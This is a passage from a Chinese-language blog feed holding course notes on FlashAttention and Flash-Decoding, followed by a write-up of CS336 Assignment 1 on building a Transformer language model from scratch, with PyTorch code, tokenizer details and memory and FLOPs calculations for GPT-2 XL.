id="核心洞察">核心洞察</h3><p>注意力是<strong>可结合的</strong>和<strong>可交换的</strong> -可以分割并归约</p><h3 id="方法">方法</h3><ol type="1"><li>将键/值<strong>分割</strong>成小块</li><li>使用 FlashAttention <strong>并行</strong>计算这些分割的注意力</li><li>对所有分割的结果进行<strong>归约</strong></li></ol><h3 id="性能表现-1">性能表现</h3><p><strong>Flash-Decoding 对于长上下文比先前工作快达 8 倍</strong></p><p><strong>示例（CodeLlama-34b，bs=1，MP=4）：</strong> - 序列长度1K：~47 tok/s（与其他方法相似） - 序列长度 16K：~38 tok/s vs ~5tok/s（FlashAttention） -即使对于非常长的序列也能<strong>保持高吞吐量</strong></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260209182919673.png" alt="image-20260209182919673" style="zoom:30%;" /></p><h2 id="总结">总结</h2><ol type="1"><li><strong>注意力机制</strong>是 Transformer 模型的核心，具有 <spanclass="math inline">\(O(N^2)\)</span> 复杂度</li><li><strong>多头注意力</strong>提供并行性和表示多样性</li><li><strong>FlashAttention</strong> 使用分块和重计算来实现 IO 效率：<ul><li>快 2-4 倍，内存减少 10-20 倍</li><li>支持更长的序列长度</li></ul></li><li><strong>LLM 推理</strong>有两个具有不同计算模式的阶段：<ul><li>预填充：多个查询（批处理）</li><li>解码：单个查询（顺序）</li></ul></li><li><strong>Flash-Decoding</strong>跨键/值并行化以实现高效的长上下文解码：<ul><li>对于长序列快达 8 倍</li><li>对于需要大上下文窗口的应用至关重要</li></ul></li></ol><h2 id="参考文献">参考文献</h2><ul><li>Vaswani et al., “Attention is All You Need”, NeurIPS 2017</li><li>Dao et al., “FlashAttention: Fast and Memory-Efficient ExactAttention with IO-Awareness”, NeurIPS 2022</li><li>Dao, “FlashAttention-2: Faster Attention with Better Parallelism andWork Partitioning”, 2023</li><li>Shazeer, “Flash-Decoding for Long-Context Inference”, 2023</li></ul>]]></content>
      
      
      <categories>
          
          <category> CMU 15-642 机器学习系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMU </tag>
            
            <tag> ML Systems </tag>
            
            <tag> 15642 </tag>
            
            <tag> Transformer </tag>
            
            <tag> Attention </tag>
            
            <tag> FlashAttention </tag>
            
            <tag> GPU优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS336 Assignment 1: Building a Transformer Language Model from Scratch</title>
      <link href="/zh/2026/02/09/CS336/CS336-Assignment-1-Building-a-Transformer-Language-Model-from-Scratch/"/>
      <url>/zh/2026/02/09/CS336/CS336-Assignment-1-Building-a-Transformer-Language-Model-from-Scratch/</url>
      
        <content type="html"><![CDATA[<h1 id="cs336-作业-1从头构建-transformer-语言模型">CS336 作业1：从头构建 Transformer 语言模型</h1><blockquote><p>对实现完整 Transformer 语言模型管道的全面反思——从 BPE分词器到文本生成——在 TinyStories 和 OpenWebText 上进行训练。</p></blockquote><hr /><h2 id="目录">目录</h2><ol type="1"><li><a href="#1-概述">概述</a></li><li><a href="#2-bpe-分词器">BPE 分词器</a></li><li><a href="#3-transformer-架构">Transformer 架构</a></li><li><a href="#4-训练基础设施">训练基础设施</a></li><li><a href="#5-训练循环">训练循环</a></li><li><a href="#6-文本生成">文本生成</a></li><li><a href="#7-实验">实验</a></li><li><a href="#8-反思">反思</a></li></ol><hr /><h2 id="概述">1. 概述</h2><p>本作业从头实现了一个完整的 Transformer 语言模型管道，未依赖于<code>torch.nn.Linear</code> 或 <code>torch.nn.Embedding</code>等高级库。代码库涵盖：</p><ul><li><strong>字节对编码 (BPE) 分词器</strong>，具有并行预分词</li><li><strong>仅解码器 Transformer</strong>，使用 RMSNorm、RoPE、SwiGLU和因果多头注意力</li><li><strong>训练基础设施</strong>：AdamW优化器、余弦学习率调度、梯度裁剪、数据加载、检查点</li><li><strong>自回归文本生成</strong>，带温度和核（top-p）采样</li><li><strong>实验</strong>：学习率扫描、批量大小研究、架构消融和OpenWebText 训练</li></ul><p><strong>完整代码已发布在 GitHub</strong>: <ahref="https://github.com/XLOverflow/CS336_Transformer_from_Scratch">https://github.com/XLOverflow/CS336_Transformer_from_Scratch</a></p><h3 id="项目结构">项目结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cs336_basics/</span><br><span class="line">├── model/</span><br><span class="line">│   ├── linear.py              # 线性层（无偏置）</span><br><span class="line">│   ├── embedding.py           # 令牌嵌入</span><br><span class="line">│   ├── normalization.py       # RMSNorm</span><br><span class="line">│   ├── positional_encoding.py # RoPE</span><br><span class="line">│   ├── attention.py           # Softmax、缩放点积注意力、多头自注意力</span><br><span class="line">│   ├── feedforward.py         # SwiGLU、SiLUFFN</span><br><span class="line">│   ├── transformer_block.py   # 预归一化 / 后归一化 Transformer 块</span><br><span class="line">│   ├── transformer_lm.py      # 完整的 Transformer LM，带有 generate()</span><br><span class="line">│   └── config.py              # 模型配置（TinyStories、GPT-2 系列）</span><br><span class="line">├── tokenizers/</span><br><span class="line">│   ├── bpe.py                 # 带并行预分词的 BPE 训练器</span><br><span class="line">│   └── tokenizer.py           # 带并行编码的 BPE 编码/解码</span><br><span class="line">└── training/</span><br><span class="line">    ├── cross_entropy.py       # 数值稳定的交叉熵</span><br><span class="line">    ├── adamw.py               # AdamW 优化器（从头开始）</span><br><span class="line">    ├── lr_schedule.py         # 余弦退火与线性预热</span><br><span class="line">    ├── gradient_clipping.py   # L2 范数梯度裁剪</span><br><span class="line">    ├── data_loader.py         # 随机批量采样</span><br><span class="line">    └── checkpointing.py       # 保存/加载模型检查点</span><br></pre></td></tr></table></figure><hr /><h2 id="bpe-分词器">2. BPE 分词器</h2><h3 id="unicode-基础">2.1 Unicode 基础</h3><p><strong>问：Unicode 代码点与 UTF-8 编码之间有什么关系？</strong></p><p>Unicode 为每个字符分配一个唯一的<strong>代码点</strong>（例如，<code>U+0041</code> 表示 ‘A’）。UTF-8是一种 <strong>可变长度编码</strong>，将代码点映射到 1–4 字节：</p><table><thead><tr class="header"><th>代码点范围</th><th>UTF-8 字节</th><th>示例</th></tr></thead><tbody><tr class="odd"><td>U+0000 – U+007F</td><td>1 字节</td><td>ASCII 字符</td></tr><tr class="even"><td>U+0080 – U+07FF</td><td>2 字节</td><td>拉丁文、希腊文、斯拉夫文</td></tr><tr class="odd"><td>U+0800 – U+FFFF</td><td>3 字节</td><td>CJK 字符，大多数表情符号</td></tr><tr class="even"><td>U+10000 – U+10FFFF</td><td>4 字节</td><td>稀有表情符号、历史脚本</td></tr></tbody></table><p>UTF-8 向后兼容ASCII，并且是自同步的：你总是可以判断一个字节是字符的开始还是继续字节。</p><p><strong>问：为什么使用字节级分词而不是字符级分词？</strong></p><p>字节级分词以 256 个字节值的基本词汇表开始，可以表示<strong>任何</strong>语言中的文本，而无需未知标记。字符级分词需要处理完整的 Unicode范围（143,000+ 字符）作为基本词汇表。</p><h3 id="bpe-训练算法">2.2 BPE 训练算法</h3><p>核心 BPE 训练过程：</p><ol type="1"><li><strong>初始化词汇表</strong>，包含 256 个字节值 +特殊标记（例如，<code>&lt;|endoftext|&gt;</code>）</li><li><strong>预分词</strong>，使用 GPT-2正则表达式模式将文本拆分为“单词”</li><li><strong>迭代合并</strong>最频繁的相邻字节对，将合并的标记添加到词汇表中</li><li>重复直到达到目标词汇表大小</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PAT = <span class="string">r&quot;&quot;&quot;&#x27;(?:[sdmt]|ll|ve|re)| ?\p&#123;L&#125;+| ?\p&#123;N&#125;+| ?[^\s\p&#123;L&#125;\p&#123;N&#125;]+|\s+(?!\S)|\s+&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>此正则表达式模式处理英语缩写（<code>'s</code>、<code>'t</code>、<code>'ll</code>等）、可选前导空格的单词、数字、标点符号和空白。</p><h3 id="并行化策略">2.3 并行化策略</h3><p>在大型语料库（例如，OpenWebText）上训练 BPE分词器计算开销大。我的实现使用 <strong>并行预分词</strong>和多进程：</p><ol type="1"><li><strong>查找与 <code>&lt;|endoftext|&gt;</code>标记对齐的块边界，以避免拆分文档</strong></li><li><strong>将块分配给工作进程</strong>，使用<code>multiprocessing.Pool</code></li><li>每个工作进程应用正则表达式预分词并返回<strong>频率计数</strong>（<code>Counter</code>）</li><li><strong>在主进程中逐步合并频率计数</strong>，以控制内存使用</li><li>BPE 合并顺序进行（因为每次合并依赖于前一次）</li></ol><p>关键优化：</p><ul><li><strong>内存管理</strong>：定期进行垃圾回收和每 5000次合并重建索引，以减少内存碎片</li><li><strong>增量对更新</strong>：在每次合并后，不必从头重新计算所有对的频率，而是维护<code>pair_to_tuples</code> 和 <code>pair_freq</code>索引，仅更新受影响的条目</li><li><strong>批处理</strong>：工作进程以 16的批量处理块，以控制并发内存使用</li></ul><h3 id="分词器实验">2.4 分词器实验</h3><p><strong>在 TinyStories 上的词汇表大小比较：</strong></p><p>对于 TinyStories 数据集，我训练了词汇表大小为 10,000的分词器。分词器成功学习了常见的英语单词和子词模式。例如：</p><ul><li>常见单词如 “the”、“and”、“once” 成为单个标记</li><li>不太常见的单词被拆分为学习到的子词单元</li><li><code>&lt;|endoftext|&gt;</code> 被处理为一个特殊标记，不参与 BPE合并</li></ul><p><strong>编码</strong>：编码器贪婪地应用 BPE合并——对于每个预分词的单词，它从单个字节开始，并重复合并优先级最高的对（在合并列表中最早的）直到没有更多合并适用。</p><p><strong>解码</strong>：简单地连接每个标记 ID 的字节值，并将结果解码为UTF-8。</p><hr /><h2 id="transformer-架构">3. Transformer 架构</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260208223722664.png" alt="image-20260208223722664" style="zoom:50%;" /></p><h3 id="线性层无偏置">3.1 线性层（无偏置）</h3><p>遵循现代 LLM 实践（PaLM、LLaMA），所有线性层省略偏置项：</p><p><span class="math display">\[y = xW^T\]</span></p><p><strong>初始化</strong>：截断正态分布 <spanclass="math inline">\(\mathcal{N}(0, \sigma^2)\)</span>，其中 <spanclass="math inline">\(\sigma = \sqrt{2 / (d_{in} +d_{out})}\)</span>，截断在 <span class="math inline">\([-3\sigma,3\sigma]\)</span>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Linear</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, in_features, out_features, device=<span class="literal">None</span>, dtype=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.weight = nn.Parameter(torch.empty(out_features, in_features, device=device, dtype=dtype))</span><br><span class="line">        std = (<span class="number">2</span> / (in_features + out_features)) ** <span class="number">0.5</span></span><br><span class="line">        nn.init.trunc_normal_(<span class="variable language_">self</span>.weight, mean=<span class="number">0.0</span>, std=std, a=-<span class="number">3</span>*std, b=<span class="number">3</span>*std)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="keyword">return</span> einsum(x, <span class="variable language_">self</span>.weight, <span class="string">&quot;... i, o i -&gt; ... o&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="令牌嵌入">3.2 令牌嵌入</h3><p>简单的查找表，将令牌 ID 映射到密集向量：</p><p><span class="math display">\[\text{embed}(x) = E[x]\]</span></p><p>其中 <span class="math inline">\(E \in \mathbb{R}^{V \timesd_{model}}\)</span> 使用截断正态 <spanclass="math inline">\(\mathcal{N}(0, 1)\)</span> 初始化。</p><h3 id="rmsnorm">3.3 RMSNorm</h3><p>均方根层归一化（Zhang &amp; Sennrich, 2019），在 LLaMA 中使用，而不是LayerNorm：</p><p><span class="math display">\[\text{RMSNorm}(x) = \frac{x}{\text{RMS}(x)} \cdot \gamma, \quad\text{RMS}(x) = \sqrt{\frac{1}{d}\sum_{i=1}^d x_i^2 + \epsilon}\]</span></p><p>关键实现细节：<strong>在计算 RMS 之前转换为 float32</strong>以确保数值稳定性，然后再转换回原始数据类型。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">    original_dtype = x.dtype</span><br><span class="line">    x = x.to(torch.float32)</span><br><span class="line">    rms = torch.sqrt(torch.mean(x ** <span class="number">2</span>, dim=-<span class="number">1</span>, keepdim=<span class="literal">True</span>) + <span class="variable language_">self</span>.eps)</span><br><span class="line">    normalized = x / rms</span><br><span class="line">    <span class="keyword">return</span> (normalized * <span class="variable language_">self</span>.weight).to(original_dtype)</span><br></pre></td></tr></table></figure><h3 id="旋转位置嵌入-rope">3.4 旋转位置嵌入 (RoPE)</h3><p>RoPE（Su et al., 2021）通过对查询和键向量应用旋转来编码<strong>相对</strong> 位置信息：</p><p><span class="math display">\[\text{RoPE}(x, m) = \begin{pmatrix} x_0 \cos(m\theta_0) - x_1\sin(m\theta_0) \\ x_0 \sin(m\theta_0) + x_1 \cos(m\theta_0) \\ \vdots\\ x_{d-2} \cos(m\theta_{d/2-1}) - x_{d-1} \sin(m\theta_{d/2-1}) \\x_{d-2} \sin(m\theta_{d/2-1}) + x_{d-1} \cos(m\theta_{d/2-1})\end{pmatrix}\]</span></p><p>其中 <span class="math inline">\(\theta_k =\theta_{\text{base}}^{-2k/d_k}\)</span>，对于 <spanclass="math inline">\(k = 0, \ldots, d_k/2 - 1\)</span>。</p><p>关键特性：</p><ul><li><strong>无可学习参数</strong>：RoPE 完全由位置和频率计算得出</li><li>仅应用于 Q 和 K（不适用于 V）</li><li>捕获 <strong>相对</strong> 位置：<span class="math inline">\(q_m^Tk_n\)</span> 仅依赖于 <span class="math inline">\(m - n\)</span></li><li>在所有层中共享（一个 RoPE 模块实例）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RotaryPositionalEmbedding</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, theta, d_k, max_seq_len, device=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        theta_k = theta ** (-<span class="number">2</span> * torch.arange(d_k // <span class="number">2</span>, device=device) / d_k)</span><br><span class="line">        positions = torch.arange(max_seq_len, device=device).unsqueeze(<span class="number">1</span>)</span><br><span class="line">        angles = positions * theta_k.unsqueeze(<span class="number">0</span>)</span><br><span class="line">        <span class="variable language_">self</span>.register_buffer(<span class="string">&quot;sin&quot;</span>, torch.sin(angles), persistent=<span class="literal">False</span>)</span><br><span class="line">        <span class="variable language_">self</span>.register_buffer(<span class="string">&quot;cos&quot;</span>, torch.cos(angles), persistent=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x, token_positions</span>):</span><br><span class="line">        sin, cos = <span class="variable language_">self</span>.sin[token_positions], <span class="variable language_">self</span>.cos[token_positions]</span><br><span class="line">        x1, x2 = x[..., ::<span class="number">2</span>], x[..., <span class="number">1</span>::<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">return</span> torch.stack((x1 * cos - x2 * sin, x1 * sin + x2 * cos), dim=-<span class="number">1</span>).flatten(-<span class="number">2</span>)</span><br></pre></td></tr></table></figure><h3 id="softmax">3.5 Softmax</h3><p>使用最大减法技巧的数值稳定 softmax：</p><p><span class="math display">\[\text{softmax}(x)_i = \frac{e^{x_i - \max(x)}}{\sum_j e^{x_j - \max(x)}}\]</span></p><h3 id="缩放点积注意力">3.6 缩放点积注意力</h3><p><span class="math display">\[\text{Attention}(Q, K, V) =\text{softmax}\left(\frac{QK^T}{\sqrt{d_k}}\right)V\]</span></p><p><span class="math inline">\(\sqrt{d_k}\)</span>的缩放防止点积的大小过大，这会将 softmax 推入极小梯度的区域。</p><p>实现使用 <code>einops.einsum</code>提高可读性，并支持任意批量维度：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">attn_scores = einsum(q, k, <span class="string">&quot;b ... q d_k, b ... k d_k -&gt; b ... q k&quot;</span>) / (d_k ** <span class="number">0.5</span>)</span><br><span class="line">attn_scores = attn_scores.masked_fill(~mask, <span class="built_in">float</span>(<span class="string">&quot;-inf&quot;</span>))  <span class="comment"># 因果掩码</span></span><br><span class="line">attn_weights = softmax(attn_scores, dim=-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> einsum(attn_weights, v, <span class="string">&quot;b ... q k, b ... k d_v -&gt; b ... q d_v&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="多头自注意力">3.7 多头自注意力</h3><p>将模型维度拆分为多个头以实现并行注意力：</p><p><span class="math display">\[\text{MultiHead}(x) = W_O \cdot \text{Concat}(\text{head}_1, \ldots,\text{head}_h)\]</span></p><p><span class="math display">\[\text{head}_i = \text{Attention}(xW_Q^i, xW_K^i, xW_V^i)\]</span></p><p>处理流程：</p><ol type="1"><li>使用单独的线性层将输入投影到 Q、K、V</li><li>重塑为单独的头部：<code>(batch, seq_len, d_model) → (batch, num_heads, seq_len, d_k)</code></li><li>对 Q 和 K 应用 RoPE</li><li>使用因果掩码（下三角）应用缩放点积注意力</li><li>连接头部并重新投影</li></ol><h3 id="前馈网络">3.8 前馈网络</h3><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260208223809903.png" alt="image-20260208223809903" style="zoom: 50%;" /></p><p><strong>SwiGLU</strong>（Shazeer, 2020）：带有 SiLU 激活的门控 FFN<span class="math display">\[\text{SwiGLU}(x) = W_2 \cdot (\text{SiLU}(W_1 x) \odot W_3 x)\]</span></p><p>其中 <span class="math inline">\(\text{SiLU}(x) = x \cdot\sigma(x)\)</span>，<span class="math inline">\(\odot\)</span>是逐元素乘法。</p><p>SwiGLU 使用 <span class="math inline">\(d_{ff} \approx \frac{8}{3}d_{model}\)</span>（四舍五入为 64 的倍数），具有 3个权重矩阵，总参数量约为 <span class="math inline">\(\approx 3 \timesd_{model} \times \frac{8}{3} d_{model} = 8 d_{model}^2\)</span>。</p><p><strong>SiLU FFN</strong>（用于消融）：标准的 2 层 FFN</p><p><span class="math display">\[\text{SiLUFFN}(x) = W_2 \cdot \text{SiLU}(W_1 x)\]</span></p><p>使用 <span class="math inline">\(d_{ff} = 4 \timesd_{model}\)</span>，具有 2 个权重矩阵，总参数量约为 <spanclass="math inline">\(\approx 2 \times d_{model} \times 4 d_{model} = 8d_{model}^2\)</span>。这与 SwiGLU的参数计数相匹配，以便进行公平的消融比较。</p><h3 id="transformer-块">3.9 Transformer 块</h3><p><strong>预归一化</strong>（默认）： <span class="math display">\[z = x + \text{Attention}(\text{RMSNorm}(x))\]</span></p><p><span class="math display">\[y = z + \text{FFN}(\text{RMSNorm}(z))\]</span></p><p><strong>后归一化</strong>（消融）： <span class="math display">\[z = \text{RMSNorm}(x + \text{Attention}(x))\]</span></p><p><span class="math display">\[y = \text{RMSNorm}(z + \text{FFN}(z))\]</span></p><p>预归一化在现代 LLM中更受欢迎，因为它稳定了训练——残差连接保留了输入的大小，而在子层之前进行归一化可以防止激活无限增长。</p><h3 id="完整的-transformer-lm">3.10 完整的 Transformer LM</h3><p>完整的仅解码器架构：</p><ol type="1"><li><strong>令牌嵌入</strong>：<code>token_ids → (batch, seq_len, d_model)</code></li><li><strong>N 个 Transformer 块</strong>：应用自注意力 +FFN，带有残差连接</li><li><strong>最终 RMSNorm</strong>：对输出进行归一化</li><li><strong>LM 头</strong>：线性投影到词汇对数<code>(batch, seq_len, vocab_size)</code></li></ol><h3 id="transformer-计算参数内存flops-和训练时间">3.11 Transformer计算：参数、内存、FLOPs 和训练时间</h3><blockquote><p>设 <span class="math inline">\(B\)</span> = batch_size，<spanclass="math inline">\(T\)</span> = context_length，<spanclass="math inline">\(d\)</span> = d_model，<spanclass="math inline">\(L\)</span> = num_layers，<spanclass="math inline">\(H\)</span> = num_heads，<spanclass="math inline">\(V\)</span> = vocab_size，<spanclass="math inline">\(d_{ff} = 4d\)</span></p></blockquote><h4 id="参数计数-p">3.11.1 参数计数 <spanclass="math inline">\(P\)</span></h4><table><colgroup><col style="width: 56%" /><col style="width: 43%" /></colgroup><thead><tr class="header"><th>组件</th><th>参数</th></tr></thead><tbody><tr class="odd"><td>每层注意力（<span class="math inline">\(W_Q, W_K, W_V,W_O\)</span>）</td><td><span class="math inline">\(4d^2\)</span></td></tr><tr class="even"><td>每层 FFN（SwiGLU: <span class="math inline">\(W_1, W_2,W_3\)</span>）</td><td><span class="math inline">\(3 \times d \times d_{ff} =12d^2\)</span></td></tr><tr class="odd"><td>每层 RMSNorm ×2</td><td><span class="math inline">\(2d\)</span></td></tr><tr class="even"><td>令牌嵌入</td><td><span class="math inline">\(Vd\)</span></td></tr><tr class="odd"><td>LM 头</td><td><span class="math inline">\(Vd\)</span></td></tr><tr class="even"><td>最终 RMSNorm</td><td><span class="math inline">\(d\)</span></td></tr></tbody></table><p><span class="math display">\[\boxed{P = L(16d^2 + 2d) + 2Vd + d}\]</span></p><h4 id="训练内存分析">3.11.2 训练内存分析</h4><p>在训练期间，GPU 内存由四部分组成（float32 = 4 字节）：</p><table><colgroup><col style="width: 18%" /><col style="width: 12%" /><col style="width: 69%" /></colgroup><thead><tr class="header"><th>组件</th><th>公式</th><th>描述</th></tr></thead><tbody><tr class="odd"><td>参数</td><td><span class="math inline">\(4P\)</span></td><td>每个参数 4 字节</td></tr><tr class="even"><td>梯度</td><td><span class="math inline">\(4P\)</span></td><td>与参数大小相同</td></tr><tr class="odd"><td>优化器 (m+v)</td><td><span class="math inline">\(8P\)</span></td><td>AdamW 存储 2 个与参数形状相同的张量</td></tr><tr class="even"><td>激活</td><td>见下文</td><td>与 batch_size 成正比</td></tr></tbody></table><p><strong>每层激活内存</strong>（为反向传播保存的中间结果）：</p><table><thead><tr class="header"><th>组件</th><th>形状</th><th>元素计数</th></tr></thead><tbody><tr class="odd"><td>RMSNorm 输入 ×2</td><td><span class="math inline">\((B,T,d)\)</span> ×2</td><td><span class="math inline">\(2BTd\)</span></td></tr><tr class="even"><td>Q, K, V</td><td><span class="math inline">\((B,T,d)\)</span> ×3</td><td><span class="math inline">\(3BTd\)</span></td></tr><tr class="odd"><td>Softmax 输出</td><td><span class="math inline">\((B,H,T,T)\)</span></td><td><span class="math inline">\(BHT^2\)</span></td></tr><tr class="even"><td>注意力输出</td><td><span class="math inline">\((B,T,d)\)</span></td><td><span class="math inline">\(BTd\)</span></td></tr><tr class="odd"><td>W1 输出（用于 SiLU 反向传播）</td><td><span class="math inline">\((B,T,d_{ff})\)</span></td><td><span class="math inline">\(4BTd\)</span></td></tr><tr class="even"><td>W3 输出</td><td><span class="math inline">\((B,T,d_{ff})\)</span></td><td><span class="math inline">\(4BTd\)</span></td></tr><tr class="odd"><td>SiLU 输出</td><td><span class="math inline">\((B,T,d_{ff})\)</span></td><td><span class="math inline">\(4BTd\)</span></td></tr><tr class="even"><td>Gate⊙Value = W2 输入</td><td><span class="math inline">\((B,T,d_{ff})\)</span></td><td><span class="math inline">\(4BTd\)</span></td></tr></tbody></table><p>每层激活 ≈ <span class="math inline">\(22BTd + BHT^2\)</span></p><p>加上非层组件：嵌入输出 (<span class="math inline">\(BTd\)</span>) +对数 (<span class="math inline">\(BTV\)</span>) + 交叉熵 softmax (<spanclass="math inline">\(BTV\)</span>) ≈ <span class="math inline">\(BTd +2BTV\)</span></p><p><span class="math display">\[\text{总激活内存} = 4 \times \left[L(22BTd + BHT^2) + BTd + 2BTV\right]\text{ 字节}\]</span></p><p><span class="math display">\[\boxed{\text{峰值内存} = 16P + 4BT\left[L(22d + HT) + d + 2V\right]}\]</span></p><h4 id="gpt-2-xl-具体示例">3.11.3 GPT-2 XL 具体示例</h4><p><span class="math inline">\(d=1600, L=48, H=25, T=1024,V=50257\)</span></p><p><strong>(a) 详细参数计数：</strong></p><p>每层参数：</p><table><colgroup><col style="width: 27%" /><col style="width: 72%" /></colgroup><thead><tr class="header"><th>组件</th><th>参数</th></tr></thead><tbody><tr class="odd"><td><span class="math inline">\(W_Q, W_K, W_V, W_O\)</span></td><td><span class="math inline">\(4 \times d^2 = 4 \times 2{,}560{,}000 =10{,}240{,}000\)</span></td></tr><tr class="even"><td><span class="math inline">\(W_1, W_2, W_3\)</span> (FFN)</td><td><span class="math inline">\(3 \times d \times d_{ff} = 3 \times10{,}240{,}000 = 30{,}720{,}000\)</span></td></tr><tr class="odd"><td>2 × RMSNorm</td><td><span class="math inline">\(2 \times 1{,}600 = 3{,}200\)</span></td></tr><tr class="even"><td><strong>每层总计</strong></td><td><strong>40,963,200</strong></td></tr></tbody></table><p>完整模型：</p><table><colgroup><col style="width: 37%" /><col style="width: 62%" /></colgroup><thead><tr class="header"><th>组件</th><th>参数</th></tr></thead><tbody><tr class="odd"><td>48 层</td><td><span class="math inline">\(48 \times 40{,}963{,}200 =1{,}966{,}233{,}600\)</span></td></tr><tr class="even"><td>令牌嵌入 (<span class="math inline">\(V \times d\)</span>)</td><td><span class="math inline">\(80{,}411{,}200\)</span></td></tr><tr class="odd"><td>LM 头</td><td><span class="math inline">\(80{,}411{,}200\)</span></td></tr><tr class="even"><td>最终 RMSNorm</td><td><span class="math inline">\(1{,}600\)</span></td></tr><tr class="odd"><td><strong>总计</strong></td><td><strong>≈ 2.13B</strong></td></tr></tbody></table><p>参数内存：<span class="math inline">\(2.13\text{B} \times 4 \text{字节} \approx 8.51 \text{ GB}\)</span></p><p><strong>(b) 内存分析：</strong></p><p><strong>模型相关内存（固定）</strong>：<spanclass="math inline">\(16P = 16 \times 2.13 \times 10^9 \approx 34.0\text{ GB}\)</span></p><p><strong>每个批量元素的激活内存</strong>： <spanclass="math display">\[L(22d + HT) + d + 2V = 48(22 \times 1600 + 25 \times 1024) + 1600 + 2\times 50257\]</span></p><p><span class="math display">\[= 48(35200 + 25600) + 102114 = 48 \times 60800 + 102114 = 2{,}920{,}514\]</span></p><p><span class="math display">\[\text{每个批量元素}: 4 \times 1024 \times 2{,}920{,}514 \approx 12.0\text{ GB}\]</span></p><p><strong>在 80GB A100 上的最大批量大小</strong>： <spanclass="math display">\[\text{总内存}: 34.0 + 12.0 \times B \leq 80 \text{ GB}\]</span></p><p><span class="math display">\[B \leq (80 - 34) / 12 \approx 3.8 \rightarrow \boxed{B_{\max} = 3}\]</span></p><h4 id="为什么前向传播-2-参数-flops标记">3.11.4 为什么前向传播 ≈ 2 ×参数 FLOPs/标记？</h4><p>Transformer 计算主要由矩阵乘法主导。对于矩阵乘法 <spanclass="math inline">\(Y = X \times W\)</span>，其中 <spanclass="math inline">\(W\)</span> 的形状为 <spanclass="math inline">\((d_{in}, d_{out})\)</span>：</p><ul><li>每个输出元素需要 <span class="math inline">\(d_{in}\)</span> 次乘法+ <span class="math inline">\(d_{in}\)</span> 次加法 = <spanclass="math inline">\(2d_{in}\)</span> FLOPs</li><li>每个标记有 <span class="math inline">\(d_{out}\)</span>个输出元素</li><li>总 FLOPs = <span class="math inline">\(2 \times d_{in} \timesd_{out}\)</span> = <strong>2 × 参数计数</strong></li></ul><p><strong>每层矩阵乘法细分</strong>（×<spanclass="math inline">\(L\)</span> 层），使用 GPT-2 XL 数字（<spanclass="math inline">\(d=1600, T=1024, H=25, d_k=64,d_{ff}=6400\)</span>）：</p><table><colgroup><col style="width: 25%" /><col style="width: 40%" /><col style="width: 21%" /><col style="width: 13%" /></colgroup><thead><tr class="header"><th>操作</th><th>维度</th><th>FLOPs 公式</th><th>FLOPs</th></tr></thead><tbody><tr class="odd"><td>Q 投影</td><td><span class="math inline">\((T,d) \times (d,d)\)</span></td><td><span class="math inline">\(2Td^2\)</span></td><td>5.24B</td></tr><tr class="even"><td>K 投影</td><td>同上</td><td><span class="math inline">\(2Td^2\)</span></td><td>5.24B</td></tr><tr class="odd"><td>V 投影</td><td>同上</td><td><span class="math inline">\(2Td^2\)</span></td><td>5.24B</td></tr><tr class="even"><td>O 投影</td><td>同上</td><td><span class="math inline">\(2Td^2\)</span></td><td>5.24B</td></tr><tr class="odd"><td><span class="math inline">\(QK^T\)</span>（<spanclass="math inline">\(H\)</span> 头）</td><td><span class="math inline">\(H \times (T,d_k) \times(d_k,T)\)</span></td><td><span class="math inline">\(2T^2d\)</span></td><td>3.36B</td></tr><tr class="even"><td>attn_weights × V</td><td><span class="math inline">\(H \times 